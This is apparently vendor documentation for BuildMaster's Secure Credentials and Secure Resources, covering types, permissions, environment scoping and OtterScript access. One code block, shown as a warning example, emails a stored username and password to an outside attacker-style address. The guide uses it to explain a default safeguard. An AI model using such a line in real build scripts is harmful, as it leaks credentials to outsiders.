---
title: Credentials & Resources
keywords: buildmaster, executions, resource-credentials
show-headings-in-nav: true
sequence: 200
---

BuildMaster has two related features that help you share resources across applications:

* **Secure Credentials** store accounts, logins, and access keys that contain secrets (i.e. encrypted fields that are visible only to privileged users)
* **Secure Resources**  provide access to a particular resource (such as a Git repository), and may be associated with a Secure Credential

### Secure Credential & Secure Resource Types
There are a few types of credentials that are built-in to BuildMaster:

* **Private Key** is primarily used by the SSH-based agent when key-based authentication is needed.
* **Username & Password** contains a username (visible) and password (secret), and is used to represent a general-purpose account, such as a Windows domain account.
* **API Key/Token** contains just a token property (which is secret), and is used by a variety of resources


There are also a few built-in resource types:

* **Inedo BuildMaster**; Connect to an instance of BuildMaster.
* **Inedo Otter**; Connect to an instance of Otter.
* **Inedo ProGet**; Connect to an instance of ProGet.
* **NuGet Package Feed**; Interact with packages on a NuGet feed.
* **Universal Package Feed**; Interact with packages on a ProGet-hosted universal feed.

However, because these are implemented as [extensions](/docs/buildmaster/administration/extensions), many integrations like [Azure DevOps](/docs/buildmaster/integrations/azure-devops/source-control), [Jira](/docs/buildmaster/integrations/jira), [Jenkins](/docs/buildmaster/integrations/jenkins), etc. will add additional types.

## Creating & Editing Secure Credentials {#creating-editing-credentials data-title="Creating & Editing Secure Credentials"}

You manage secure credentials under Application Settings > Credentials or Administration > Secure Credentials. 

All secure credentials have the following properties:

*   **Name** - a name of up to 50 characters that will be used to reference the resource credential; while you can change the name later, any operation or component that relied on that name will no longer be able to find it
*   **Application** - indicates whether the secure credential is an application-level credential or global (shared)
*   **Environment** - optional; restricts what environments the credential may be used in, and which users have access to it
*   **OtterScript Usage** - optional; you can allow the `$CredentialProperty` variable function to extract secure properties
*   **Environment Restriction** - optional; when set, a runtime error will occur when this credential is used in a deployment plan that is not running in the same environment

Depending on the type of secure credential, there will be other fields like Username or Password that you can edit.

Secret fields (like Password) will be displayed as an empty textbox, and entering a value in the textbox will change it. You can click the "Show Secret fields" button to show these values if you have the appropriate permissions.

## Using Credentials and Resources {#credentials-and-otterscript data-title="Using Credentials and Resources"}

Most Operations that work with resources and/or credentials will let you use a secure resource name and/or a secure credential name. 

For example, although the `AzureDevOps::Get-Source` operation has all the properties necessary to connect to a Azure DevOps repository (InstanceUrl, Usernname, Token, Project, etc.), you can simply specify a configured secure resource name instead.

````
AzureDevOps::Get-Source
(
    From: MyAzureDevOpsResource
);
````

At runtime, the operation will search for a secure resource named `MyAzureDevOpsResource`. If that secure resource has a secure credential name configured, then the associated secure credential will also be used. 

Note that, if the credential has "restricted to environment use" configured, then this will only be permitted if the deployment plan is running in the same environment. This can be frustrating and unintuitive to your users, so be careful when using it.

## Limiting Secure Credential Access {#limiting-access data-title="Limiting Secure Credential Access"}

You may want to permit or restrict certain users from accessing certain secure credentials, such as allowing Developers to manage credentials in the Integration and Testing environments. This is done by associating credentials with an environment, and then creating the appropriate [access controls](/docs/buildmaster/administration/users-and-security) scoped to that environment.

There are two task attributes you can use to control this access:

*   **Manage Credentials** will allow you to view, delete, and edit credentials, but not view existing encrypted/sensitive fields
*   **View Passwords** will allow you to view encrypted/sensitive fields on a credential

On the manage credentials page, users will only see the credentials they have permission to manage, and will only be able to create credentials in permitted environments.

## Accessing Properties from OtterScript {#credentials-as-variables data-title="OtterScript Usage"}

Most Operations will simply input the name of a Secure Resource or Secure Credential, and use the properties you've configured. However, there may be times when you need to access the configured properties, such as such as if you want to pass a username or password to a script or command-line utility.

To access the properties of a configured Secure Credential or Secure Property from within OtterScript, you can use the [$SecureCredentialProperty](/docs/buildmaster/reference/functions/credentials/securecredentialproperty) and [$SecureResourceProperty](/docs/buildmaster/reference/functions/credentials/secureresourceproperty) functions.

````
set $host = $CredentialProperty(InternalProGet, ServerUrl);

exec sometool.exe --host $host;
````

By default, accessing secret properties of a secure credential will raise an error. This is to prevent malicious OtterScript like this:

````
# NOTE - this won't actually work unless you explciitly allow it
Send-Email
(
    To: hacker45@agam.ru,
    Subject: Username is $HdarsUser and password is $HdarsPassword
);
````

If you absolutely need to access secret field on a Secure Credential (such as a Password or API Token), you'll need to enable variable usage on that credential. Here is a case where you may need to do that:

````
set $HDarsUser = $SecureCredentialProperty(UsernamePassword::HDarsUser, UserName);
set $HDarsPassword = $SecureCredentialProperty(UsernamePassword::HDarsUser, Password);
exec hdars-tool.exe --user $HdarsUser -- pass $HdarsPassword;
````

If you have important credentials, you should strongly consider writing a custom operation that can securely handle the credentials.


## Legacy Resource Credentials (BuildMaster 6.1) {#61 data-title="Resource Credentials (BuildMaster 6.1)"}
Prior to BuildMaster 6.2, a single feature called "Resource Credentials" was used instead of Secure Credentials and Secure Resources. These will appear with a warning icon on the secure credentials page.

While Resource Credentials are considered a "Legacy Feature", you can still create and edit them as needed. In some cases, such as custom/community extensions, they may be the only option, until the extension is adapted to use the new features.

Many operations that utilize a Secure Resource will attempt to search for a Resource Credential if the specified Secure Resource was not found. This enables upgrades without breaking previous OtterScripts plans and modules. 

### Converting to Secure Credentials & Resources
You can "convert" a Resource Credential into a Secure Credentials and/or Secure Resources from the manage secure credentials page. This is a one-way conversion, so make sure to save important information (like the password) if you need to recreate it.

For example, a "GitHub Resource Credential" would convert to a "GitHub Account" (Secure Credential) and a "GitHub Project" (Secure Resource), unless the Username was empty; in that case, it will only be converted to a Secure Resource.

### Legacy Resource Credential Cascading Rules

BuildMaster v6.1.10 introduced "cascading resource credentials", which allowed for credentials to be created at the application-group level. A resource credential could also "inherit" from another resource credential, which would cause specific properties to be overriden. 

For example, an individual application's resource credentials could specify a system-level parent that has username/password information stored for a full system, and then override just the "repository URL". This way, you can specify the secret value in one location (with elevated privileges required to access it), and connect to different repositories consistently throughout all applications.

For security reasons, the environment of the parent credential must match the inheritor's exactly, or the parent environment must not be specified (indicating that it applies to all environments)

When resolving a resource credential at execution time, candidates by name are selected in order of matching properties: application + environment, application, application group, ancestor application-group, environment, system.
